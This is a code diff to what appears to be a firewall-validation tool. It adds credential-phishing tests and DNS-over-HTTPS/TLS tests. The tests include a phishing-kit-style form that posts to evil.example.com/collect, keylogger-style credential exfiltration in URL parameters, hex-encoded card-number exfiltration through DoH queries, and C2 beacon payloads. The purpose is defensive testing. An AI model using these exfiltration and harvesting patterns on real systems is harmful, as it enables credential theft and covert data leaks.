@@ -146,6 +146,16 @@ EXPECTED_BEHAVIOR = {
     'c2_dns_c2': 'Firewall Anti-Spyware should detect C2 communication over DNS TXT queries with encoded data in subdomain labels, characteristic of tools like dnscat2 and Cobalt Strike DNS beacon',
     'c2_icmp_tunnel': 'Firewall Anti-Spyware or Zone Protection should detect data exfiltration over ICMP echo requests with oversized or encoded payloads, characteristic of tools like icmpsh and ptunnel',
     'c2_http_beacon': 'Firewall Anti-Spyware should detect periodic HTTP beacon patterns with rotating User-Agents, encoded payloads, and consistent callback intervals characteristic of C2 frameworks',
+    # Credential Phishing
+    'phish_http_login': 'Firewall Credential Phishing Prevention should detect corporate credential submission to an untrusted HTTP login form and block the POST request',
+    'phish_https_login': 'Firewall Credential Phishing Prevention (with SSL Decryption) should detect credential submission over HTTPS to an untrusted login form',
+    'phish_js_exfil': 'Firewall URL Filtering or Credential Phishing Prevention should detect credentials being exfiltrated via URL query parameters (simulating JavaScript keylogger)',
+    'phish_hidden_form': 'Firewall Credential Phishing Prevention should detect credential harvesting via hidden form fields with redirect to external collection domain',
+    # Encrypted DNS
+    'doh_google': 'Firewall App-ID should identify and block DNS-over-HTTPS (DoH) traffic to Google DNS (dns.google), preventing encrypted DNS bypass of DNS Security policies',
+    'doh_cloudflare': 'Firewall App-ID should identify and block DNS-over-HTTPS (DoH) traffic to Cloudflare DNS (cloudflare-dns.com), preventing DNS policy bypass',
+    'doh_exfil': 'Firewall should detect data exfiltration via DNS-over-HTTPS — hex-encoded data sent as subdomains in DoH queries bypassing standard DNS inspection',
+    'dot_query': 'Firewall App-ID should identify and block DNS-over-TLS (DoT) traffic, preventing encrypted DNS from bypassing DNS Security and logging policies',
 }
 
 # ─── Test Catalog ───────────────────────────────────────────
@@ -384,10 +394,41 @@ C2_EXPANDED_TESTS = [
         'block', 'Anti-Spyware', threat_id='86506 — HTTP C2 Beacon'),
 ]
 
+CREDENTIAL_PHISHING_TESTS = [
+    SecurityTestCase('phish_http_login', 'HTTP Credential Submission',
+        'credential_phishing', 'Submits test corporate credentials (username/password) to an HTTP login form. PAN-OS Credential Phishing Prevention should detect and block credential submission to untrusted sites.',
+        'block', 'Credential Phishing Prevention'),
+    SecurityTestCase('phish_https_login', 'HTTPS Credential Submission',
+        'credential_phishing', 'Submits test credentials to an HTTPS login form. Requires SSL Decryption to inspect the encrypted POST body. Tests credential phishing prevention with decryption enabled.',
+        'block', 'Credential Phishing Prevention + SSL Decryption'),
+    SecurityTestCase('phish_js_exfil', 'JS-Based Credential Theft',
+        'credential_phishing', 'Simulates JavaScript keylogger exfiltration — sends credentials in URL query parameters via GET request. Tests detection of credential data in URLs.',
+        'block', 'URL Filtering + Credential Phishing Prevention'),
+    SecurityTestCase('phish_hidden_form', 'Hidden Form Credential Harvest',
+        'credential_phishing', 'Submits credentials via a phishing kit-style form with hidden fields (CSRF token, redirect to external collection domain). Tests detection of suspicious credential harvesting patterns.',
+        'block', 'Credential Phishing Prevention'),
+]
+
+ENCRYPTED_DNS_TESTS = [
+    SecurityTestCase('doh_google', 'DNS-over-HTTPS (Google)',
+        'encrypted_dns', 'Sends a DNS query over HTTPS to Google DNS (dns.google) using the JSON API. Firewall App-ID should identify and control DoH traffic to prevent DNS policy bypass.',
+        'block', 'DNS Security / App-ID', threat_id='App-ID: dns-over-https'),
+    SecurityTestCase('doh_cloudflare', 'DNS-over-HTTPS (Cloudflare)',
+        'encrypted_dns', 'Sends a DNS query over HTTPS to Cloudflare DNS (cloudflare-dns.com). Tests whether the firewall detects and blocks DoH traffic to alternative DNS providers.',
+        'block', 'DNS Security / App-ID', threat_id='App-ID: dns-over-https'),
+    SecurityTestCase('doh_exfil', 'Data Exfiltration via DoH',
+        'encrypted_dns', 'Sends hex-encoded sensitive data as DNS subdomain labels via DoH query. Tests whether the firewall can detect data exfiltration over encrypted DNS channels.',
+        'block', 'DNS Security + Anti-Spyware', threat_id='App-ID: dns-over-https'),
+    SecurityTestCase('dot_query', 'DNS-over-TLS Query',
+        'encrypted_dns', 'Initiates a DNS-over-TLS connection to Google DNS on port 853. Firewall App-ID should identify DoT traffic and enforce DNS policies.',
+        'block', 'DNS Security / App-ID', threat_id='App-ID: dns-over-tls'),
+]
+
 ALL_TESTS = (WEB_ATTACK_TESTS + MALWARE_TESTS + C2_EXPANDED_TESTS +
              URL_FILTERING_TESTS + DNS_ATTACK_TESTS + PROTOCOL_ABUSE_TESTS +
              FILE_THREAT_TESTS + SSL_DECRYPTION_TESTS + APPID_VALIDATION_TESTS +
-             DATA_EXFILTRATION_TESTS + EVASION_TECHNIQUE_TESTS)
+             DATA_EXFILTRATION_TESTS + EVASION_TECHNIQUE_TESTS +
+             CREDENTIAL_PHISHING_TESTS + ENCRYPTED_DNS_TESTS)
 TEST_MAP = {t.id: t for t in ALL_TESTS}
 
 # Default URL Filtering test URLs (configurable at runtime)
@@ -480,6 +521,16 @@ ATTACK_PAYLOADS = {
     'c2_dns_c2': 'Y21kPXdob2FtaQ.c2.attacker.example.com|aWQ9YWRtaW4.beacon.attacker.example.com|c3RhdHVzPWFsaXZl.check.attacker.example.com',
     'c2_icmp_tunnel': 'ICMP-TUNNEL-DATA:Y21kPXdob2FtaSAmJiBob3N0bmFtZSAmJiBpZA==',
     'c2_http_beacon': 'eyJiZWFjb24iOiJ0cnVlIiwic2xlZXAiOjYwLCJqaXR0ZXIiOjEwfQ==',
+    # Credential Phishing
+    'phish_http_login': 'username=admin@acmecorp.com&password=P@ssw0rd123!',
+    'phish_https_login': 'username=admin@acmecorp.com&password=P@ssw0rd123!',
+    'phish_js_exfil': 'u=admin@acmecorp.com&p=P@ssw0rd123!&action=keylog&src=formgrabber',
+    'phish_hidden_form': 'username=admin@acmecorp.com&password=P@ssw0rd123!&csrf_token=abc123def456&redirect_url=http://evil.example.com/collect&org=AcmeCorp',
+    # Encrypted DNS
+    'doh_google': 'malware.testcategory.com',
+    'doh_cloudflare': 'phishing.testcategory.com',
+    'doh_exfil': '4111111111111111.exfil.testdomain.com',
+    'dot_query': 'hacking.testcategory.com',
 }
 
 # ─── Custom Pattern Store ──────────────────────────────────
@@ -889,6 +940,10 @@ class SecurityTestEngine:
             return self._test_data_exfiltration(test, host, http_port)
         elif test.category == 'evasion_techniques':
             return self._test_evasion_technique(test, host, http_port)
+        elif test.category == 'credential_phishing':
+            return self._test_credential_phishing(test, host, http_port)
+        elif test.category == 'encrypted_dns':
+            return self._test_encrypted_dns(test, host, http_port)
         else:
             return self._error_result(test, f'Unknown category: {test.category}')
 
@@ -1923,6 +1978,215 @@ class SecurityTestEngine:
             except (requests.ConnectionError, requests.Timeout, OSError) as e:
                 return self._blocked_result(test, f'Connection blocked: {e}',
                     url=url, method='GET', sent_payload=payload)
+
+    def _test_credential_phishing(self, test: SecurityTestCase, host: str,
+                                    http_port: int) -> SecurityTestResult:
+        """Test credential phishing prevention — submit credentials to login forms."""
+        payload = ATTACK_PAYLOADS.get(test.id, '')
+
+        if test.id == 'phish_http_login':
+            url = f'http://{host}:{http_port}/login'
+            try:
+                resp = requests.post(url, data={
+                    'username': 'admin@acmecorp.com',
+                    'password': 'P@ssw0rd123!',
+                }, timeout=10)
+                if resp.status_code == 200 and 'authenticated' in (resp.text or '').lower():
+                    return self._passthrough_result(test, resp.status_code,
+                        'Credentials accepted — Credential Phishing Prevention did not block submission. '
+                        'Verify User-ID is configured and Credential Phishing Prevention is enabled in URL Filtering profile',
+                        resp=resp, url=url, method='POST', sent_payload=payload)
+                return self._analyze_response(test, resp, 'authenticated',
+                    url=url, method='POST', sent_payload=payload)
+            except (requests.ConnectionError, requests.Timeout, OSError) as e:
+                return self._blocked_result(test,
+                    f'Connection blocked — Credential Phishing Prevention detected credential submission: {e}',
+                    url=url, method='POST', sent_payload=payload)
+
+        elif test.id == 'phish_https_login':
+            url = f'https://{host}:443/login'
+            try:
+                resp = requests.post(url, data={
+                    'username': 'admin@acmecorp.com',
+                    'password': 'P@ssw0rd123!',
+                }, timeout=10, verify=False)
+                if resp.status_code == 200 and 'authenticated' in (resp.text or '').lower():
+                    return self._passthrough_result(test, resp.status_code,
+                        'Credentials accepted over HTTPS — SSL Decryption + Credential Phishing Prevention did not block. '
+                        'Verify SSL Decryption policy and Credential Phishing Prevention are both active',
+                        resp=resp, url=url, method='POST', sent_payload=payload)
+                return self._analyze_response(test, resp, 'authenticated',
+                    url=url, method='POST', sent_payload=payload)
+            except (requests.ConnectionError, requests.Timeout, OSError) as e:
+                return self._blocked_result(test,
+                    f'Connection blocked — credential submission over HTTPS detected: {e}',
+                    url=url, method='POST', sent_payload=payload)
+
+        elif test.id == 'phish_js_exfil':
+            url = f'http://{host}:{http_port}/echo?u=admin@acmecorp.com&p=P@ssw0rd123!&action=keylog&src=formgrabber'
+            try:
+                resp = requests.get(url, timeout=10)
+                if resp.status_code == 200:
+                    return self._passthrough_result(test, resp.status_code,
+                        'Credentials exfiltrated via URL parameters — firewall did not detect credential data in GET request. '
+                        'Check URL Filtering and Credential Phishing Prevention settings',
+                        resp=resp, url=url, method='GET', sent_payload=payload)
+                return self._analyze_response(test, resp, '',
+                    url=url, method='GET', sent_payload=payload)
+            except (requests.ConnectionError, requests.Timeout, OSError) as e:
+                return self._blocked_result(test,
+                    f'Connection blocked — credential exfiltration via URL detected: {e}',
+                    url=url, method='GET', sent_payload=payload)
+
+        elif test.id == 'phish_hidden_form':
+            url = f'http://{host}:{http_port}/login'
+            try:
+                resp = requests.post(url, data={
+                    'username': 'admin@acmecorp.com',
+                    'password': 'P@ssw0rd123!',
+                    'csrf_token': 'abc123def456',
+                    'redirect_url': 'http://evil.example.com/collect',
+                    'org': 'AcmeCorp',
+                }, timeout=10)
+                if resp.status_code == 200 and 'authenticated' in (resp.text or '').lower():
+                    return self._passthrough_result(test, resp.status_code,
+                        'Phishing form accepted credentials with redirect to external domain — '
+                        'Credential Phishing Prevention should detect this pattern',
+                        resp=resp, url=url, method='POST', sent_payload=payload)
+                return self._analyze_response(test, resp, 'authenticated',
+                    url=url, method='POST', sent_payload=payload)
+            except (requests.ConnectionError, requests.Timeout, OSError) as e:
+                return self._blocked_result(test,
+                    f'Connection blocked — phishing form credential harvest detected: {e}',
+                    url=url, method='POST', sent_payload=payload)
+
+        return self._error_result(test, f'Unknown credential phishing test: {test.id}')
+
+    def _test_encrypted_dns(self, test: SecurityTestCase, host: str,
+                             http_port: int) -> SecurityTestResult:
+        """Test encrypted DNS (DoH/DoT) — firewall should detect and control encrypted DNS channels."""
+        payload = ATTACK_PAYLOADS.get(test.id, '')
+
+        if test.id == 'doh_google':
+            url = f'https://dns.google/resolve?name={payload}&type=A'
+            try:
+                result = subprocess.run(
+                    ['curl', '-s', '-m', '5', '-H', 'accept: application/dns-json', url],
+                    capture_output=True, text=True, timeout=10
+                )
+                if result.returncode == 0 and result.stdout and '"Answer"' in result.stdout:
+                    return self._passthrough_result(test, 200,
+                        'DoH query to Google DNS succeeded — firewall did not block DNS-over-HTTPS. '
+                        'Enable App-ID policy to block dns-over-https application',
+                        url=url, method='GET', sent_payload=payload)
+                if result.returncode != 0 or not result.stdout:
+                    return self._blocked_result(test,
+                        f'DoH query blocked — App-ID identified and blocked dns-over-https (exit code: {result.returncode})',
+                        url=url, method='GET', sent_payload=payload)
+                return self._blocked_result(test,
+                    f'DoH query did not return DNS answer — possibly blocked: {result.stdout[:150]}',
+                    url=url, method='GET', sent_payload=payload)
+            except (subprocess.TimeoutExpired, OSError) as e:
+                return self._blocked_result(test,
+                    f'DoH connection timed out or blocked: {e}',
+                    url=url, method='GET', sent_payload=payload)
+
+        elif test.id == 'doh_cloudflare':
+            url = f'https://cloudflare-dns.com/dns-query?name={payload}&type=A'
+            try:
+                result = subprocess.run(
+                    ['curl', '-s', '-m', '5', '-H', 'accept: application/dns-json', url],
+                    capture_output=True, text=True, timeout=10
+                )
+                if result.returncode == 0 and result.stdout and '"Answer"' in result.stdout:
+                    return self._passthrough_result(test, 200,
+                        'DoH query to Cloudflare DNS succeeded — firewall did not block DNS-over-HTTPS. '
+                        'Enable App-ID policy to block dns-over-https application',
+                        url=url, method='GET', sent_payload=payload)
+                if result.returncode != 0 or not result.stdout:
+                    return self._blocked_result(test,
+                        f'DoH query blocked — App-ID identified and blocked dns-over-https (exit code: {result.returncode})',
+                        url=url, method='GET', sent_payload=payload)
+                return self._blocked_result(test,
+                    f'DoH query did not return answer — possibly blocked: {result.stdout[:150]}',
+                    url=url, method='GET', sent_payload=payload)
+            except (subprocess.TimeoutExpired, OSError) as e:
+                return self._blocked_result(test,
+                    f'DoH connection timed out or blocked: {e}',
+                    url=url, method='GET', sent_payload=payload)
+
+        elif test.id == 'doh_exfil':
+            # Encode credit card data as hex subdomain in DoH query
+            exfil_data = '4111111111111111'
+            hex_encoded = exfil_data.encode().hex()
+            domain = f'{hex_encoded}.exfil.testdomain.com'
+            url = f'https://dns.google/resolve?name={domain}&type=A'
+            try:
+                result = subprocess.run(
+                    ['curl', '-s', '-m', '5', '-H', 'accept: application/dns-json', url],
+                    capture_output=True, text=True, timeout=10
+                )
+                if result.returncode == 0 and result.stdout and len(result.stdout) > 10:
+                    return self._passthrough_result(test, 200,
+                        'Data exfiltration via DoH succeeded — hex-encoded sensitive data sent in DNS subdomain over HTTPS. '
+                        'Firewall did not block encrypted DNS exfiltration channel',
+                        url=url, method='GET', sent_payload=f'{hex_encoded}.exfil.testdomain.com')
+                return self._blocked_result(test,
+                    f'DoH exfiltration blocked — firewall detected encrypted DNS data channel (exit code: {result.returncode})',
+                    url=url, method='GET', sent_payload=f'{hex_encoded}.exfil.testdomain.com')
+            except (subprocess.TimeoutExpired, OSError) as e:
+                return self._blocked_result(test,
+                    f'DoH exfiltration blocked: {e}',
+                    url=url, method='GET', sent_payload=f'{hex_encoded}.exfil.testdomain.com')
+
+        elif test.id == 'dot_query':
+            # DNS-over-TLS on port 853
+            url = 'tls://dns.google:853'
+            try:
+                # Build a minimal DNS query for the domain
+                domain = payload or 'hacking.testcategory.com'
+                txn_id = os.urandom(2)
+                flags = struct.pack('!H', 0x0100)  # standard query, recursion desired
+                counts = struct.pack('!HHHH', 1, 0, 0, 0)  # 1 question
+                qname = b''
+                for label in domain.split('.'):
+                    qname += bytes([len(label)]) + label.encode()
+                qname += b'\x00'
+                qtype_qclass = struct.pack('!HH', 1, 1)  # A record, IN class
+                dns_query = txn_id + flags + counts + qname + qtype_qclass
+                # Wrap in TCP length prefix for DNS-over-TLS
+                dns_msg = struct.pack('!H', len(dns_query)) + dns_query
+
+                # Connect via TLS to port 853
+                ctx = ssl.create_default_context()
+                ctx.check_hostname = False
+                ctx.verify_mode = ssl.CERT_NONE
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(5)
+                tls_sock = ctx.wrap_socket(sock, server_hostname='dns.google')
+                tls_sock.connect(('dns.google', 853))
+                tls_sock.sendall(dns_msg)
+                resp_data = tls_sock.recv(4096)
+                tls_sock.close()
+
+                if resp_data and len(resp_data) > 4:
+                    return self._passthrough_result(test, 200,
+                        'DNS-over-TLS query succeeded — firewall did not block DoT on port 853. '
+                        'Enable App-ID policy to block dns-over-tls application',
+                        url=url, method='TLS', sent_payload=domain)
+                return self._blocked_result(test,
+                    'DoT query returned empty response — possibly blocked',
+                    url=url, method='TLS', sent_payload=domain)
+            except (ConnectionResetError, BrokenPipeError) as e:
+                return self._blocked_result(test,
+                    f'Connection reset — App-ID blocked DNS-over-TLS: {e}',
+                    url=url, method='TLS', sent_payload=payload)
+            except (socket.timeout, ssl.SSLError, OSError) as e:
+                return self._blocked_result(test,
+                    f'DoT connection blocked or timed out: {e}',
+                    url=url, method='TLS', sent_payload=payload)
+
+        return self._error_result(test, f'Unknown encrypted DNS test: {test.id}')
 
     # ─── Built-in Test Overrides ─────────────────────────────
 
